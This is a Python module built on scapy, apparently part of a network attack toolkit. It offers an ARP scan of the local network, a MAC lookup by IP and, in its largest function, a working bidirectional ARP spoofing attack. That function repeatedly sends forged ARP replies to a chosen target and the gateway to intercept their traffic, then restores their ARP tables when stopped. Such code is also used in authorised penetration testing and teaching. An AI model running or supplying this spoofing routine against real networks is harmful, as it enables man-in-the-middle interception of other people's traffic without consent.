import os, sys, time, itertools
import scapy.all as scapy
from scapy.all import Ether, ARP, IP, srp, send, atol, conf

from .utils import *

class NF_ARP_Tool:
    def __init__(self, interface): 
        self.interface = interface # NetworkInterface


    def arp_scan(self): # NetworkInterface | None
        network = get_network_addr_with_cidr(self.interface)
        if not network:
            print('[-] Could not obtain network address. Scanning aborted.')
            return
        
        print(f'[*] Starting the ARP scanning to {network}...')
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, iface=self.interface, verbose=0)

        print('\n{:15}   {:17}   {}'.format('IPv4', 'MAC', 'Vendor (OUI)'))
        print('=' * 80)
        for s, r in sorted(ans, key=lambda x: atol(x[1][ARP].psrc)):
            ip  = r[ARP].psrc
            mac = r[ARP].hwsrc # r[Ether].src
            oui = str_fixed_len(conf.manufdb._get_manuf(mac), 42).strip()
            print('{:15}   {:17}   {}'.format(ip, mac, oui))
        print('=' * 80)
        
        print('\n[+] ARP scan completed.')



    def get_mac_by_ip_using_arp(self, ip): # str -> str | None
        print(f'[*] Finding which device has {ip}...')
        
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, iface=self.interface, verbose=0)
        if len(ans) == 0:
            print('[-] Device not found. Please check the IP.')
            return None
        
        mac = ans[0][1][ARP].hwsrc # [0]=first packet, [1]=recv
        print(f'[+] Device has been found with "{mac}" ({conf.manufdb._get_manuf(mac)})')
        return mac


    def arp_spoof(self, target_ip=None, gateway_ip=None): # str | None, str | None
        if not gateway_ip:
            default_ip = get_ipv4_gateway(self.interface)
            gateway_ip = input(f'[?] Enter Gateway IP {f"({default_ip}) " if default_ip else ""}: ').strip()
            if gateway_ip == '': gateway_ip = default_ip
        if not target_ip:
            target_ip = input('[?] Enter Target IP : ').strip()

        if not is_valid_ipv4(gateway_ip):
            print('\n[-] Gateway IP is invalid.')
            return
        if not is_valid_ipv4(target_ip):
            print('\n[-] Target IP is invalid.')
            return

        print(f'[*] Starting the bidirectional ARP spoofing... (TAR={target_ip} <---> GW={gateway_ip})\n')

        target_mac  = self.get_mac_by_ip_using_arp(target_ip)
        gateway_mac = self.get_mac_by_ip_using_arp(gateway_ip)
        if not target_mac or not gateway_mac:
            print('\n[-] MAC address not found. Stop spoofing.')
            return
        
        print('\n[+] Found all MAC addresses. Now sending forged packets...')
        print('[*] To stop ARP spoofing, press Ctrl+C keys.\n')

        def get_mac(ip):
            return target_mac if ip == target_ip else gateway_mac
        
        def spoof(target_ip, spoof_ip):
            packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
            send(packet, iface=self.interface, verbose=0)

        def restore(src_ip, dst_ip):
            packet = ARP(op=2, pdst=dst_ip, hwdst=get_mac(dst_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
            send(packet, iface=self.interface, verbose=0)

        sent_count = 0
        try:
            while True:
                spoof(target_ip, gateway_ip)
                spoof(gateway_ip, target_ip)
                sent_count += 2
                print('\r[*] Packets Sent: ' + str(sent_count), end='')
                time.sleep(1) # Wait for a second
        except KeyboardInterrupt:
            print('\n\n[!] Ctrl+C pressed!')
            print('[*] Restoring ARP tables of target and gateway...\n')
            sent_count = 0
            for _ in range(5):
                restore(gateway_ip, target_ip)
                restore(target_ip, gateway_ip)
                sent_count += 2
                print('\r[*] Packets Sent: ' + str(sent_count), end='')
                time.sleep(0.5)
            print('\n\n[+] ARP spoof stopped.')


